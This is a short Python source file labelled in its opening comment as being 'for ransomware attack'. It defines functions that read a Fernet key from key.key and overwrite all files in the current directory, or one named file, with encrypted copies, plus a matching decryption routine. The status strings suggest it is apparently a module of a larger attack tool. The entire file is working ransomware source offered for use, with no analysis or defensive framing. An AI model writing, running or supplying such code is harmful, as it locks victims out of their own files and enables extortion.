#for ransomware attack
import os

from cryptography.fernet import Fernet


def encryption(file_name):
    try:
        with open('key.key', 'rb') as f:
            key = f.read()

        fernet = Fernet(key)
        files = [f for f in os.listdir('.') if os.path.isfile(f)]
        if file_name=='all':
            for f in files:
                with open(f, 'rb') as file:
                    original = file.read()
                encrypted_file_data = fernet.encrypt(original)
                with open(f, 'wb') as encrypted_file:
                    encrypted_file.write(encrypted_file_data)

        else:
            for f in files:
                if f==file_name:
                    with open(f, 'rb') as file:
                        original = file.read()
                    encrypted_file_data = fernet.encrypt(original)
                    with open(f, 'wb') as encrypted_file:
                        encrypted_file.write(encrypted_file_data)

                else:
                    pass
        return ('[+] encryption suceeded')
    except Exception as e:
        return(str(e))

def decryption(file_name):
    try:
        with open('key.key', 'rb') as f:
            key = f.read()

        fernet = Fernet(key)
        files = [f for f in os.listdir('.') if os.path.isfile(f)]
        if file_name=='all':
            for f in files:
                with open(f, 'rb') as file:
                    original = file.read()
                decrypted_file_data = fernet.decrypt(original)
                with open(f, 'wb') as decrypted_file:
                    decrypted_file.write(decrypted_file_data)
        else:
            for f in files:
                if f==file_name:
                    with open(f, 'rb') as file:
                        original = file.read()
                    decrypted_file_data = fernet.decrypt(original)
                    with open(f, 'wb') as decrypted_file:
                        decrypted_file.write(decrypted_file_data)

                else:
                    pass
        return ('[+]decryption succeded')

    except Exception as e:
        return(str(e))

